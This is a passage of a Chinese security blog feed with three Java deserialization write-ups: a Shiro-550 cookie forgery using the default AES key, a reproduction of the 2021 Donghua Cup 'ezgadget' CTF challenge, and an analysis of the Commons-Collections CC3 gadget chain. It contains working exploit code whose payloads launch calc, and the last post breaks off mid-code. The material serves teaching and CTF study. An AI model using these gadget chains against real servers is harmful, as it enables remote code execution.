&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再利用已知key对其AES和base64加密，python脚本为：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># －*-* coding:utf-8</span></span><br><span class="line"><span class="comment"># @Time    :  2023/03/21 22:51</span></span><br><span class="line"><span class="comment"># @Author  : XiLitter</span></span><br><span class="line"><span class="comment"># @FileName: aes3.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    ：https://xilitter.github.io/</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_file_data</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span>  <span class="built_in">open</span>(filename,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - <span class="built_in">len</span>(s) % BS) * <span class="built_in">chr</span>(BS - <span class="built_in">len</span>(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    ciphertext =  base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    data = get_file_data(<span class="string">&quot;web.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(aes_enc(data))</span><br></pre></td></tr></table></figure><p>替换Cookie发包：</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/18.png" class><p>用户角色变为Guest，</p><img src="/2023/03/21/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2/19.png" class><p>成功发起DNS请求解析，反序列化验证成功。</p><p>反序列化之路任重而道远。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a href="https://www.cnblogs.com/nice0e3/p/14183173.html">Java安全之Shiro 550反序列化漏洞分析</a></p><p><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.788&vd_source=f071e738f9dfd2c0aaef0c96b89916ba">shiro550流程分析</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东华杯ezgadget复现</title>
      <link href="/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学了cc链后找个题练练吧，本篇文章记录东华杯2021ezgadget题目的复现过程。题目附件网上随处可见，在这就不放附件了。题目不是很难 ，看看吧。</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>利用jd-gui工具反编译jar包，idea新建maven项目，把反编译好的源码拷贝进去。运行代码启动服务</p><img src="/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/1.png" class><p>本地环境启动成功，当然也可以运行jar包来起环境，只不过放在idea中更好调试。废话不多说了开始分析。有一个控制器类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span></span><br><span class="line"> &#123;</span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="meta">@RequestMapping(&#123;&quot;/readobject&quot;&#125;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">     <span class="type">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">     <span class="comment">//读取字节数组中的内容</span></span><br><span class="line">     <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">     <span class="comment">//该对象可以读取序列化的Java对象。</span></span><br><span class="line">     <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">     <span class="comment">//读取一个UTF-8编码的字符串</span></span><br><span class="line">     <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">     <span class="comment">//读取一个整数值</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> objectInputStream.readInt();</span><br><span class="line">     <span class="keyword">if</span> (name.equals(<span class="string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="number">2021</span>) &#123;</span><br><span class="line">         <span class="comment">//反序列化</span></span><br><span class="line">       objectInputStream.readObject();</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>设计了两个路由，重点在于&#x2F;readobject路由，对我们传入的data数据base64解码，然后满足下面这个if判断就会反序列化。反序列化的漏洞点有了，接下来找找利用类。有一个ToStringBean类，</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToStringBean</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        com.ezgame.ctf.tools.<span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.ezgame.ctf.tools.ToStringBean();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> toStringBean.defineClass((String)<span class="literal">null</span>, <span class="built_in">this</span>.ClassByte, <span class="number">0</span>, <span class="built_in">this</span>.ClassByte.length);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Obj</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Obj = clazz.newInstance();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继承了ClassLoader，在toString函数中用defineClass函数进行类加载，又有newInstance初始化，很明显，这里可以任意代码执行了。再看看其他类吧，Tools类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tools</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String base64) &#123;</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">decoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="keyword">return</span> decoder.decode(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        Base64.<span class="type">Encoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义了base64加密解密，序列化，反序列化的函数。还有一个user类没啥用，就不贴代码了。我们最终的目的是调用ToStringBean的toString函数来代码执行，结合反序列化，我们需要找到一个重写了readObject方法，并且在该方法中调用了任意类的toString方法的类。有这样的类吗？当然有，cc5的入口类就满足条件了，BadAttributeValueExpException类。看看它的readObject方法。</p><img src="/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/2.png" class><p>读取var属性的值赋给valObj，并调用valObj的toString方法。val属性是我们可控的，那么链子就直接走完了，很短吧。主要思路：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException-&gt;readObject()-&gt;ToStringBean-&gt;toString()-&gt;任意类加载</span><br></pre></td></tr></table></figure><p>编写被加载的类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.exp;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">payload</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成class文件，然后编写攻击类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.exp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">exp</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">objval</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        objval.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        objval.set(badAttributeValueExpException, toStringBean);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">b</span> <span class="operator">=</span> toStringBean.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classbyte</span> <span class="operator">=</span> b.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classbyte.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] filebin = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/payload.class&quot;</span>));</span><br><span class="line">        classbyte.set(toStringBean, filebin);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line">        <span class="type">byte</span>[] code = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Tools.base64Encode(code);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了满足if条件判断，将gadgets和2021写入流，通过反射修改类属性，这些都是常规操作了。</p><img src="/2023/03/17/%E4%B8%9C%E5%8D%8E%E6%9D%AFezgadget%E5%A4%8D%E7%8E%B0/3.png" class><p>成功弹出计算器。</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> ctf </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc3链分析</title>
      <link href="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/"/>
      <url>/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>继续来分析cc链了，相较于cc1，这条cc3链就是改变了最后的执行类。由之前的Runtime命令执行改变为动态类加载，能够任意代码执行，对于命令执行，代码执行应用更加广泛。这篇cc3的分析文章也是基于cc1分析文章的基础上编写。</p><h2 id="CC3链分析"><a href="#CC3链分析" class="headerlink" title="CC3链分析"></a>CC3链分析</h2><h3 id="执行类"><a href="#执行类" class="headerlink" title="执行类"></a>执行类</h3><p>我们知道CC3链是任意类动态加载来代码执行的，而这个利用点就在defineClass方法中。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/1.png" class><p>而这个方法主要做的事情就是由字节码数据加载为java对象，也就是类的加载。这个方法是由protected修饰，不能直接被包外的类调用。那么我们就逆向找哪个public修饰的方法调用了此处。在Templateslmpl类中的defineClass方法中调用了。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/2.png" class><p>这也不是public，继续找。在本类的defineTransletClasses方法调用了。继续往上找，在该类的getTransletInstance方法中调用了。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/3.png" class><p>我们知道，执行静态代码块需要满足两个条件，类加载与初始化。而这个方法中对_class初始化了，所以我们需要将链走到这里。这个还是私有的方法，继续往上找，看谁调用了它。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/4.png" class><p>public方法有了。那么就从这个地方开始编写代码看能不能代码执行。</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>在getTransletInstance方法中，需要满足_name不为空，_class不用，它默认为空。而走到defineTransletClasses方法中，_bytecodes不能为空。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/5.png" class><p>而这里会遍历bytecodes数组进行类加载。而bytecodes是一个二维数组，所以这里我们需要传恶意类的字节码。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/6.png" class><p>这里_tfactory属性不能为空，因为它需要调用某个类的函数。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/7.png" class><p>而它是由transient修饰的，不能序列化，那怎么办？链子是不是走不通了。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/8.png" class><p>不用慌，在readObject方法中对这个属性赋值了。所以在序列化操作中不用管这个属性了，而我们测试的时候需要给它赋值。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/9.png" class><p>细节都处理完了，先编写恶意类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc3.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testdemo</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么这个恶意类要继承AbstractTranslet类？</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/10.png" class><p>这里我们需要让_transletIndex不能小于0，不然会抛出异常。所以需要走到if语句里面对它赋值。这个if判断说的就是被加载的类的父类是不是ABSTRACT_TRANSLET，再看这个属性是什么值。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/11.png" class><p>那么一切都说的通了。将恶意类编译成class文件，编写执行类：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc3.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//反射修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哦耶，成功弹出计算器。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/12.png" class><h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><p>我们知道执行代码的入口就是newTransformer方法，那么继续往上找，在TrAXFilter类的构造方法中调用了。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/13.png" class><p>很不巧，这个类是不能序列化的，我们只能在它的构造方法中赋值调用。CC3链作者用到了InstantiateTransformer这个类。重点在于它的transform方法。</p><img src="/2023/03/12/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc3%E9%93%BE%E5%88%86%E6%9E%90/14.png" class><p>它会调用任意类的构造函数，可以解决上面类不能实例化的问题。只要调用了InstantiateTransformer类的transform方法，就可以任意代码执行。接下来找入口类，和cc1的相同，相较于cc1链，它就是把InvokerTransformer类替换成这个类了。而入口类还是AnnotationInvocationHandler，具体细节在cc1这篇文章写了，在这就不再赘述。所以整条链为：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cc3.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3test02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, NoSuchMethodException, InvocationTargetException, InstantiationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">//反射修改值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/classes/Testdemo.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span 